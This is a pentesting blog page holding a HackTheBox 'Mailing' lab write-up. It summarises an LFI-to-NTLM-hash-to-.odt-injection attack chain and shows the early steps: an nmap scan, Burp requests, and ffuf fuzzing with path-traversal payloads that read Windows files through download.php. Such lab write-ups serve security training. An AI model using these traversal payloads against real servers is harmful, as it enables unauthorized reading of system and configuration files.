<!doctype html><html lang=en><head><title>HTB Mailing WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Mailing' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Mailing WriteUp"><meta name=twitter:description content="HackThebox 'Mailing' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/mailing/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Mailing WriteUp"><meta property="og:description" content="HackThebox 'Mailing' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-07T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-07T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Hmailserver"><meta property="article:tag" content="Netexec"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/mailing/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/mailing/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/mailing/>HTB Mailing WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-07T00:00:00Z>7 September, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
16-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hmailserver/>Hmailserver</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/evil-winrm/>Evil-Winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/brute-force-password-cracking/>Brute Force Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/libreoffice/>Libreoffice</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/impacket/>Impacket</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/responder/>Responder</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/python/>Python</a></span></div></div></header><div class=post-content><h1 id=mailing----hackthebox>Mailing &ndash; HackTheBox
<a class=heading-link href=#mailing----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Mailing&rsquo; Avatar" src=/pentesting/images/Mailing_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Mailing</code> is an easy box/machine from <code>HackTheBox</code> platform. After performing an initial scan with <code>Nmap</code>, we see that the server is running a webserver. We find a resource that is vulnerable to <code>Local File Inclusion</code>, which allows us to read a configuration file and extract a password for an email service. Abusing <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-21413 class=external-link target=_blank rel=noopener>CVE-2024-21413</a>, we send multiple malicious mails; with this we are able to get the NTLMv2 hash for one of the users that opens a malicious mail and crack its password. This user is allowed to connect into the victim machine through <code>WinRM</code> service, which allows us to gain initial access to the victim machine. Once inside, we see there is a directory executing/opening <code>.odt</code> files. We then use the vulnerability <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-2255 class=external-link target=_blank rel=noopener>CVE-2023-2255</a> to inject code in <code>.odt</code> files that are being executed. This code is executed by a privileged user in the system, which allows us to gain full controll of the system.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Starting with a <code>Nmap</code> scan shows multiple ports open: <code>25</code> <code>Simple Mail Transfer Protocol</code> (<code>SMTP</code>), <code>80</code> <code>HTTP</code> (running <code>Microsoft IIS</code>), <code>110</code> <code>Post Office Protocol</code> (<code>POP3</code>), <code>135</code> <code>Microsoft RPC</code>, <code>143</code> <code>Internet Message Access Protocol</code> (<code>IMAP</code>), <code>445</code> <code>Server Message Block</code> (<code>SMB</code>), <code>465</code>, <code>587</code> <code>hMailServer</code> and <code>5985</code> <code>Windows Remote Management</code> (<code>WinRM</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,49669 10.10.11.14 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 21:10 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.14
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.28s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>25/tcp    open  smtp          hMailServer smtpd
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span></span><span class=line><span class=cl><span class=go>|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://mailing.htb
</span></span></span><span class=line><span class=cl><span class=go>110/tcp   open  pop3          hMailServer pop3d
</span></span></span><span class=line><span class=cl><span class=go>|_pop3-capabilities: USER UIDL TOP
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>143/tcp   open  imap          hMailServer imapd
</span></span></span><span class=line><span class=cl><span class=go>|_imap-capabilities: IDLE CHILDREN IMAP4rev1 SORT completed CAPABILITY QUOTA IMAP4 OK RIGHTS=texkA0001 ACL NAMESPACE
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>465/tcp   open  ssl/smtp      hMailServer smtpd
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-02-27T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2029-10-06T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span></span><span class=line><span class=cl><span class=go>|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span></span><span class=line><span class=cl><span class=go>587/tcp   open  smtp          hMailServer smtpd
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
</span></span></span><span class=line><span class=cl><span class=go>|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-02-27T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2029-10-06T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>993/tcp   open  ssl/imap      hMailServer imapd
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-02-27T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2029-10-06T18:24:10
</span></span></span><span class=line><span class=cl><span class=go>|_imap-capabilities: IDLE CHILDREN IMAP4rev1 SORT completed CAPABILITY QUOTA IMAP4 OK RIGHTS=texkA0001 ACL NAMESPACE
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>5040/tcp  open  unknown
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>7680/tcp  open  pando-pub?
</span></span></span><span class=line><span class=cl><span class=go>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-06-03T01:13:13
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled but not required
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 215.54 seconds
</span></span></span></code></pre></div><p>Visiting <code>http://10.10.11.14</code> redirects to <code>http://mailing.htb</code>, so I add this domain to my <code>/etc/hosts</code> file running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.14 mailing.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Re-visiting <code>http://mailing.htb</code> now shows a website that presents a service for mailing against scams and phishing. It says that it runs using <code>hMailServer</code>:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>hMailServer</code> is a free, open source, e-mail server for <code>Windows|Microsoft Windows</code>. It&rsquo;s used by Internet service providers, companies, governments, schools and enthusiasts in all parts of the world.
It supports the common e-mail protocols (<code>IMAP</code>, <code>SMTP</code> and <code>POP3</code>) and can easily be integrated with many existing web mail systems. It has flexible score-based spam protection and can attach to your virus scanner to scan all incoming and outgoing email.</div></div><p><img alt="Mailing 1" src=/pentesting/images/Mailing_1.png></p><p>Scrolling down I can see that there is a button that says <code>Download Instructions</code>. If we click on it it downloads a file named <code>instructions.pdf</code>. As the filename says, it shows instructions about how to install <code>hMailServer</code> in <code>Windows</code> and <code>Linux</code> OSs.</p><p><img alt="Mailing 2" src=/pentesting/images/Mailing_2.png></p><p>When I put my mouse over <code>Download Instructions</code> I can see the url <code>mailing.htb/download.php?file=instructions.pdf</code>. I decide to intercept this with <code>Burpsuite</code>. If we intercept it we get the request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=instructions.pdf</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p>I will send this to the <code>Repeater</code>, ensure that we are sending requests to <code>HTTP</code> instead of <code>HTTPs</code> (clicking, on the <code>Repeater</code> at the top right pencil icon and unselect <code>Use HTTPs</code>). For example, if I search for a directory that does not exist with the request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/test</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></div><p>We get a message <code>404: archivo o directorio no encontrado</code> (it directly translates to <code>404: file or directory not found</code>):</p><p><img alt="Mailing 3" src=/pentesting/images/Mailing_3.png></p><p>If I search for a file that does not exist I get <code>File not found.</code>:</p><p><img alt="Mailing 4" src=/pentesting/images/Mailing_4.png></p><p>After attempting some files and playing with parameters I will check if <code>file</code> parameter is vulnerable to <code>Local File Inclusion</code> (<code>LFI</code>). I download a &ldquo;LFI Payload list&rdquo; from <a href=https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt class=external-link target=_blank rel=noopener>this Github repository</a>. Then, I use <code>ffuf</code> to start searching for <code>HTTP</code> responses after we filter by fake positives:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -X GET -w LFI_payloads.txt -u &#39;http://mailing.htb/download.php?file=FUZZ&#39; -fw 3,71 -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://mailing.htb/download.php?file=FUZZ
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /home/gunzf0x/HTB/HTBMachines/Easy/Mailing/content/LFI_payloads.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 55
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response words: 3,71
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 157ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\WINDOWS\win.ini  [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 154ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 154ms]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 154ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>\\\..\..\..\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts [Status: 200, Size: 849, Words: 172, Lines: 24, Duration: 162ms]
</span></span></span><span class=line><span class=cl><span class=go>../../windows/win.ini   [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 160ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\WINDOWS\win.ini  [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 162ms]
</span></span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 162ms]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 149ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 150ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 150ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>\..\..\..\..\..\..\WINDOWS\win.ini [Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 150ms]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 159ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=gp>%</span>5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69 <span class=o>[</span>Status: 200, Size: 92, Words: 6, Lines: 8, Duration: 153ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>:: Progress: [70466/70466] :: Job [1/1] :: 303 req/sec :: Duration: [0:03:29] :: Errors: 6 ::
</span></span></span></code></pre></div><p>For example, if I pick the payload <code>\\\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</code> and paste it to <code>file</code> parameter from <code>download.php</code> in <code>Burpsuite</code> we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/download.php?file=\\\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>mailing.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://mailing.htb/</span>
</span></span><span class=line><span class=cl><span class=n>Dnt</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>cross-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Te</span><span class=o>:</span> <span class=l>trailers</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
